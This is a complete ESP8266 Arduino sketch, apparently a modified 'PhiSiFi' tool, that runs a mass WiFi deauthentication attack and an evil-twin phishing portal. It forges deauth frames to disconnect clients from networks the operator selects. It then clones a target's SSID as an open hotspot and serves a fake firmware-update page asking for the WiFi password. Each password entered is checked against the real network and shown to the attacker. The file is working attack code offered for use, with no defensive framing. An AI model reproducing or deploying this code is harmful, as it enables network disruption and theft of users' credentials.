#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <ESP8266HTTPClient.h>
#include <vector>  // For storing multiple targets

extern "C" {
#include "user_interface.h"
}

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _Network;

const byte DNS_PORT = 53;
IPAddress apIP(172, 217, 28, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
std::vector<_Network> _selectedNetworks;  // NEW: Multiple selected networks
int _currentTargetIndex = 0;              // For rotating through targets

String _correct = "";
String _tryPassword = "";
bool hotspot_active = false;
bool deauthing_active = false;
bool mass_mode = false;                   // NEW: Enable mass attack mode

// Default main strings
#define SUBTITLE "TROUBLESHOOTING"
#define TITLE "<warning class='text-4xl text-yellow-500 font-bold'>&#9888;</warning> Mass Deauth + Evil Twin"
#define BODY "Your router encountered a problem while automatically installing the latest firmware update.<br>To revert the old firmware and manually update later, please verify your password."

// ============================================================
// UTILITY FUNCTIONS
// ============================================================

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += '0';
    str += String(b[i], HEX);
    if (i < size - 1) str += ':';
  }
  return str;
}

// ============================================================
// WEB PAGE GENERATION
// ============================================================

String header(String t) {
  String CSS = "body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; background-color: #f7f9fb; color: #333; margin: 0; padding: 0; }"
               ".container { max-width: 800px; margin: 0 auto; padding: 1.5rem; }"
               ".card { background-color: #ffffff; border-radius: 1rem; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); padding: 2rem; margin-top: 2rem; }"
               "nav { background-color: #2b6cb0; color: #ffffff; padding: 1.5rem; text-align: center; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }"
               "nav b { display: block; font-size: 1.5rem; margin-bottom: 0.5rem; }"
               "h1 { margin-top: 0; color: #2d3748; text-align: center; font-size: 1.8rem; }"
               "p { text-align: center; line-height: 1.6; margin-bottom: 1.5rem; color: #4a5568; }"
               "label { display: block; margin-bottom: 0.5rem; font-weight: 600; color: #2d3748; }"
               "input[type=password] { width: 100%; padding: 0.75rem; border: 1px solid #e2e8f0; border-radius: 0.5rem; margin-bottom: 1rem; box-sizing: border-box; }"
               "input[type=submit] { width: 100%; padding: 0.75rem; background-color: #3182ce; color: #fff; border: none; border-radius: 0.5rem; cursor: pointer; font-size: 1rem; font-weight: 600; transition: background-color 0.2s; }"
               "input[type=submit]:hover { background-color: #2c5282; }"
               ".footer { text-align: center; margin-top: 2rem; font-size: 0.875rem; color: #a0aec0; }"
               ".alert-success { background-color: #f0fff4; color: #2f855a; border: 1px solid #c6f6d5; padding: 1rem; border-radius: 0.5rem; text-align: center; font-weight: 600; }"
               ".grid-container { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 1rem; margin-top: 2rem; }"
               ".grid-card { background-color: #ffffff; border-radius: 0.75rem; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); padding: 1.5rem; display: flex; flex-direction: column; justify-content: space-between; }"
               ".grid-card h3 { margin: 0 0 0.5rem 0; font-size: 1.25rem; color: #2d3748; font-weight: 600; }"
               ".grid-card p { margin: 0; font-size: 0.875rem; color: #718096; }"
               ".grid-card .info { margin-bottom: 1rem; }"
               ".grid-card .button-wrapper { margin-top: auto; }"
               "button { padding: 0.5rem 1rem; border-radius: 0.5rem; font-weight: 600; cursor: pointer; transition: background-color 0.2s; border: none; }"
               "button.select-btn { background-color: #48bb78; color: white; }"
               "button.select-btn:hover { background-color: #38a169; }"
               "button.select-btn.selected { background-color: #2b6cb0; }"  // NEW: Selected state
               "button.deauth-btn-start { background-color: #e53e3e; color: white; }"
               "button.deauth-btn-stop { background-color: #718096; color: white; }"
               "button.hotspot-btn-start { background-color: #3182ce; color: white; }"
               "button.hotspot-btn-stop { background-color: #718096; color: white; }"
               "button:disabled { background-color: #e2e8f0; cursor: not-allowed; }"
               ".button-group { display: flex; gap: 1rem; margin-bottom: 2rem; flex-wrap: wrap; }"
               ".password-form { margin-top: 2rem; }"
               ".selected-count { color: #2b6cb0; font-weight: bold; }";
  String a = String(_selectedNetworks.size() > 0 ? _selectedNetworks[0].ssid : "MASS");
  return "<!DOCTYPE html><html>"
         "<head><title>" + a + " :: " + t + "</title>"
         "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
         "<style>" + CSS + "</style>"
         "<meta charset=\"UTF-8\"></head>"
         "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav>"
         "<div class='container'><div class='card'>";
}

String footer() {
  return "</div><div class='footer'><a>&#169; All rights reserved.</a></div></div></body></html>";
}

String index() {
  return header(TITLE) +
         "<p class='mb-4'>" + BODY + "</p>"
         "<div class='password-form'><form action='/' method=post>"
         "<label for='password'>WiFi password:</label>"
         "<input type=password id='password' name='password' minlength='8'></input>"
         "<input type=submit value='Continue'></form></div>" +
         footer();
}

// ============================================================
// DEAUTH FUNCTION (SAME AS BEFORE)
// ============================================================

uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };

void sendDeauthPacket(uint8_t* bssid, uint8_t* station, uint8_t channel, uint8_t reason) {
  wifi_set_channel(channel);
  
  uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x01, 0x00
  };
  
  if (station) {
    memcpy(&deauthPacket[4], station, 6);
  } else {
    memcpy(&deauthPacket[4], broadcast, 6);
  }
  
  memcpy(&deauthPacket[10], bssid, 6);
  memcpy(&deauthPacket[16], bssid, 6);
  deauthPacket[24] = reason;
  
  deauthPacket[0] = 0xC0;
  wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
  
  deauthPacket[0] = 0xA0;
  wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
  
  deauthPacket[24] = 0x07;
  deauthPacket[0] = 0xC0;
  wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
  
  deauthPacket[0] = 0xA0;
  wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
}

// ============================================================
// MASS DEAUTH FUNCTION - NEW
// ============================================================

void massDeauthLoop() {
  if (_selectedNetworks.size() == 0) {
    deauthing_active = false;
    Serial.println("WARNING: No networks selected for mass attack!");
    return;
  }
  
  // Rotate through all selected networks
  _currentTargetIndex = (_currentTargetIndex + 1) % _selectedNetworks.size();
  _Network target = _selectedNetworks[_currentTargetIndex];
  
  Serial.print("Mass attacking: ");
  Serial.println(target.ssid);
  
  // Send deauth packets to this target
  sendDeauthPacket(target.bssid, NULL, target.ch, 1);
  sendDeauthPacket(target.bssid, NULL, target.ch, 7);
}

// ============================================================
// EVIL TWIN FUNCTIONS - MODIFIED FOR MASS
// ============================================================

void startEvilTwin() {
  if (_selectedNetworks.size() == 0) {
    Serial.println("ERROR: No networks selected for Evil Twin!");
    return;
  }
  
  // Use the first selected network for Evil Twin (or rotate)
  _Network target = _selectedNetworks[0];
  hotspot_active = true;
  Serial.println("Evil Twin STARTED for: " + target.ssid);
  
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.softAPConfig(IPAddress(172, 217, 28, 1), IPAddress(172, 217, 28, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP(target.ssid.c_str());
  dnsServer.start(53, "*", IPAddress(172, 217, 28, 1));
}

void stopEvilTwin() {
  hotspot_active = false;
  Serial.println("Evil Twin STOPPED");
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.softAPConfig(IPAddress(172, 217, 28, 1), IPAddress(172, 217, 28, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP("PhiSiFi_OnFire", "244466666x");
  dnsServer.start(53, "*", IPAddress(172, 217, 28, 1));
}

// ============================================================
// SCAN FUNCTION
// ============================================================

void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
  Serial.println("Scan complete. Found " + String(n) + " networks.");
}

// ============================================================
// WEB HANDLERS - MODIFIED FOR MULTI-SELECT
// ============================================================

void handleResult() {
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", "<!DOCTYPE html><html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><style>body{background-color:#f7f9fb;font-family:sans-serif;text-align:center;padding:2rem;}.card{background-color:white;border-radius:1rem;box-shadow:0 4px 6px rgba(0,0,0,0.1);padding:2rem;max-width:400px;margin:2rem auto;}.error-icon{font-size:3rem;color:#e53e3e;}.error-text{font-size:1.5rem;color:#c53030;font-weight:bold;margin-top:1rem;}.info-text{margin-top:0.5rem;color:#4a5568;}</style><script>setTimeout(function(){window.location.href='/';},4000);</script></head><body><div class='card'><div class='error-icon'>&#8855;</div><div class='error-text'>Wrong Password</div><p class='info-text'>Please, try again.</p></div></body></html>");
    Serial.println("Wrong password tried!");
  } else {
    _correct = "SSID: " + _selectedNetworks[0].ssid + "<br> PASS: " + _tryPassword;
    hotspot_active = false;
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.softAPConfig(IPAddress(172, 217, 28, 1), IPAddress(172, 217, 28, 1), IPAddress(255, 255, 255, 0));
    WiFi.softAP("PhiSiFi_OnFire", "244466666x");
    dnsServer.start(53, "*", IPAddress(172, 217, 28, 1));
    Serial.println("Good password was entered !");
    Serial.println(_correct);
    webServer.send(200, "text/html", "<!DOCTYPE html><html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><style>body{background-color:#f7f9fb;font-family:sans-serif;text-align:center;padding:2rem;}.card{background-color:white;border-radius:1rem;box-shadow:0 4px 6px rgba(0,0,0,0.1);padding:2rem;max-width:400px;margin:2rem auto;}.success-icon{font-size:3rem;color:#48bb78;}.success-text{font-size:1.5rem;color:#2f855a;font-weight:bold;margin-top:1rem;}.info-text{margin-top:0.5rem;color:#4a5568;}</style><script>setTimeout(function(){window.location.href='/admin';},3000);</script></head><body><div class='card'><div class='success-icon'>&#10004;</div><div class='success-text'>Password Verified!</div><p class='info-text'>Redirecting to admin panel...</p></div></body></html>");
  }
}

String _tempHTML = "<!DOCTYPE html><html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                   "<style>"
                   "body{font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; background-color: #f7f9fb; color: #333; margin: 0; padding: 0;}"
                   ".container { max-width: 800px; margin: 0 auto; padding: 1.5rem; }"
                   ".card { background-color: #ffffff; border-radius: 1rem; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); padding: 2rem; margin-top: 2rem; }"
                   "nav { background-color: #2b6cb0; color: #ffffff; padding: 1.5rem; text-align: center; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }"
                   "nav b { display: block; font-size: 1.5rem; margin-bottom: 0.5rem; }"
                   "h1 { margin-top: 0; color: #2d3748; text-align: center; font-size: 1.8rem; }"
                   "p { text-align: center; line-height: 1.6; margin-bottom: 1.5rem; color: #4a5568; }"
                   ".grid-container { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 1rem; margin-top: 2rem; }"
                   ".grid-card { background-color: #ffffff; border-radius: 0.75rem; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); padding: 1.5rem; display: flex; flex-direction: column; justify-content: space-between; }"
                   ".grid-card h3 { margin: 0 0 0.5rem 0; font-size: 1.25rem; color: #2d3748; font-weight: 600; }"
                   ".grid-card p { margin: 0; font-size: 0.875rem; color: #718096; }"
                   ".grid-card .info { margin-bottom: 1rem; }"
                   ".grid-card .button-wrapper { margin-top: auto; }"
                   "button { padding: 0.5rem 1rem; border-radius: 0.5rem; font-weight: 600; cursor: pointer; transition: background-color 0.2s; border: none; }"
                   "button.select-btn { background-color: #48bb78; color: white; }"
                   "button.select-btn:hover { background-color: #38a169; }"
                   "button.select-btn.selected { background-color: #2b6cb0; }"
                   "button.deauth-btn-start { background-color: #e53e3e; color: white; }"
                   "button.deauth-btn-stop { background-color: #718096; color: white; }"
                   "button.hotspot-btn-start { background-color: #3182ce; color: white; }"
                   "button.hotspot-btn-stop { background-color: #718096; color: white; }"
                   "button:disabled { background-color: #e2e8f0; cursor: not-allowed; }"
                   ".button-group { display: flex; gap: 1rem; margin-bottom: 2rem; flex-wrap: wrap; }"
                   ".alert-success { background-color: #f0fff4; color: #2f855a; border: 1px solid #c6f6d5; padding: 1rem; border-radius: 0.5rem; text-align: center; font-weight: 600; }"
                   ".selected-count { color: #2b6cb0; font-weight: bold; margin-left: 1rem; }"
                   "</style>"
                   "</head><body><nav><b>PhiSiFi_OnFire</b> ADMIN PANEL - MASS ATTACK</nav><div class='container'><div class='card'>"
                   "<h1>Available Networks <span class='selected-count'>({count} selected)</span></h1>"
                   "<div class='button-group'>"
                   "<form method='post' action='/?deauth={deauth}'>"
                   "<button class='deauth-btn-{deauth}' {disabled}>{deauth_button}</button></form>"
                   "<form method='post' action='/?hotspot={hotspot}'>"
                   "<button class='hotspot-btn-{hotspot}' {disabled}>{hotspot_button}</button></form>"
                   "<form method='post' action='/?clear=1'>"
                   "<button class='hotspot-btn-stop'>Clear All</button></form>"
                   "</div>"
                   "<div class='grid-container'>";

void handleIndex() {
  // Handle Clear All
  if (webServer.hasArg("clear")) {
    _selectedNetworks.clear();
    Serial.println("Cleared all selected networks");
    webServer.sendHeader("Location", "/", true);
    webServer.send(302, "text/plain", "");
    return;
  }
  
  // Handle network selection TOGGLE (click to add/remove)
  if (webServer.hasArg("ap")) {
    String bssidStr = webServer.arg("ap");
    _Network found;
    bool foundNetwork = false;
    
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == bssidStr) {
        found = _networks[i];
        foundNetwork = true;
        break;
      }
    }
    
    if (foundNetwork) {
      // Check if already selected
      bool alreadySelected = false;
      for (auto& net : _selectedNetworks) {
        if (bytesToStr(net.bssid, 6) == bssidStr) {
          alreadySelected = true;
          break;
        }
      }
      
      if (alreadySelected) {
        // Remove from selection (toggle off)
        for (auto it = _selectedNetworks.begin(); it != _selectedNetworks.end(); ++it) {
          if (bytesToStr(it->bssid, 6) == bssidStr) {
            _selectedNetworks.erase(it);
            Serial.println("Removed from selection: " + found.ssid);
            break;
          }
        }
      } else {
        // Add to selection (toggle on)
        _selectedNetworks.push_back(found);
        Serial.println("Added to selection: " + found.ssid);
      }
    }
    
    // Redirect back to main page
    webServer.sendHeader("Location", "/", true);
    webServer.send(302, "text/plain", "");
    return;
  }
  
  // Handle deauth toggle
  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      if (_selectedNetworks.size() == 0) {
        webServer.send(200, "text/html", "<html><body><h2>ERROR: No networks selected!</h2><a href='/'>Go back</a></body></html>");
        return;
      }
      deauthing_active = true;
      Serial.println("MASS DEAUTH STARTED on " + String(_selectedNetworks.size()) + " networks");
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
      Serial.println("MASS DEAUTH STOPPED");
    }
  }
  
  // Handle hotspot toggle
  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      if (_selectedNetworks.size() == 0) {
        webServer.send(200, "text/html", "<html><body><h2>ERROR: No networks selected!</h2><a href='/'>Go back</a></body></html>");
        return;
      }
      startEvilTwin();
    } else if (webServer.arg("hotspot") == "stop") {
      stopEvilTwin();
    }
  }
  
  if (!hotspot_active) {
    String _html = _tempHTML;
    
    // Replace selected count
    String countStr = String(_selectedNetworks.size());
    _html.replace("{count}", countStr);
    
    for (int i = 0; i < 16; ++i) {
      if (_networks[i].ssid == "") break;
      
      String bssidStr = bytesToStr(_networks[i].bssid, 6);
      
      // Check if this network is selected
      bool isSelected = false;
      for (auto& net : _selectedNetworks) {
        if (bytesToStr(net.bssid, 6) == bssidStr) {
          isSelected = true;
          break;
        }
      }
      
      _html += "<div class='grid-card'>"
               "<h3 style='text-align:center;'>" + _networks[i].ssid + "</h3>"
               "<div class='info'>"
               "<p><strong>BSSID:</strong> " + bssidStr + "</p>"
               "<p><strong>Channel:</strong> " + String(_networks[i].ch) + "</p>"
               "</div>"
               "<div class='button-wrapper'>"
               "<form style='text-align:center;' method='post' action='/?ap=" + bssidStr + "'>";
      
      if (isSelected) {
        _html += "<button class='select-btn selected'>Selected ✓</button></form>";
      } else {
        _html += "<button class='select-btn'>Select</button></form>";
      }
      _html += "</div></div>";
    }
    
    _html.replace("{deauth_button}", deauthing_active ? "Stop Mass Deauth" : "Start Mass Deauth");
    _html.replace("{deauth}", deauthing_active ? "stop" : "start");
    _html.replace("{hotspot_button}", hotspot_active ? "Stop EvilTwin" : "Start EvilTwin");
    _html.replace("{hotspot}", hotspot_active ? "stop" : "start");
    _html.replace("{disabled}", _selectedNetworks.size() == 0 ? " disabled" : "");
    
    _html += "</div>";
    
    if (_correct != "") {
      _html += "<div class='alert-success mt-4' style='margin-top:20px'><h3>Mission Successful</h3><p>" + _correct + "</p></div>";
    }
    
    _html += "</div></div></body></html>";
    webServer.send(200, "text/html", _html);
  } else {
    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      delay(1000);
      WiFi.disconnect();
      // Use the first selected network for password verification
      WiFi.begin(_selectedNetworks[0].ssid.c_str(), webServer.arg("password").c_str(), _selectedNetworks[0].ch, _selectedNetworks[0].bssid);
      webServer.send(200, "text/html", "<!DOCTYPE html><html><head><style>body{background-color:#f7f9fb;font-family:sans-serif;text-align:center;padding:2rem;}.card{background-color:white;border-radius:1rem;box-shadow:0 4px 6px rgba(0,0,0,0.1);padding:2rem;max-width:400px;margin:2rem auto;}.spinner{border:6px solid #e2e8f0;border-top:6px solid #3182ce;border-radius:50%;width:50px;height:50px;animation:spin 2s linear infinite;margin:0 auto;margin-bottom:1rem;}@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}.text-center{text-align:center;font-size:1.5rem;font-weight:bold;color:#4a5568;}.progress-bar{height:10px;background-color:#e2e8f0;border-radius:5px;overflow:hidden;margin-top:1rem;}.progress-fill{height:100%;background-color:#3182ce;width:10%;animation:progress 15s forwards;}@keyframes progress{0%{width:10%;}100%{width:100%;}}</style><script>setTimeout(function(){window.location.href='/result';},15000);</script></head><body><div class='card'><div class='spinner'></div><div class='text-center'>Verifying integrity, please wait...</div><div class='progress-bar'><div class='progress-fill'></div></div></div></body></html>");
    } else {
      webServer.send(200, "text/html", index());
    }
  }
}

void handleAdmin() {
  // Simple redirect to main page for simplicity
  webServer.sendHeader("Location", "/", true);
  webServer.send(302, "text/plain", "");
}

// ============================================================
// SETUP
// ============================================================

void setup() {
  Serial.begin(115200);
  Serial.println("\n\n=== PhiSiFi MASS ATTACK Starting ===");
  
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  
  WiFi.softAPConfig(IPAddress(172, 217, 28, 1), IPAddress(172, 217, 28, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP("PhiSiFi_OnFire", "244466666x");
  dnsServer.start(53, "*", IPAddress(172, 217, 28, 1));
  
  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.onNotFound(handleIndex);
  webServer.begin();
  
  Serial.println("AP: PhiSiFi_OnFire");
  Serial.println("Password: 244466666x");
  Serial.println("IP: 172.217.28.1");
  Serial.println("MASS ATTACK MODE ENABLED!");
  Serial.println("Click 'Select' to add/remove networks.");
}

// ============================================================
// LOOP
// ============================================================

unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  
  // MASS DEAUTH ATTACK - Cycles through all selected networks
  if (deauthing_active) {
    if (_selectedNetworks.size() > 0) {
      if (millis() - deauth_now >= 50) {
        massDeauthLoop();
        deauth_now = millis();
      }
    } else {
      deauthing_active = false;
      Serial.println("WARNING: Mass deauth stopped - no networks selected!");
    }
  }
  
  // Scan for networks every 15 seconds
  if (millis() - now >= 15000) {
    performScan();
    now = millis();
  }
  
  // Check Wi-Fi status every 2 seconds
  if (millis() - wifinow >= 2000) {
    if (WiFi.status() != WL_CONNECTED) {
      // Not connected
    }
    wifinow = millis();
  }
}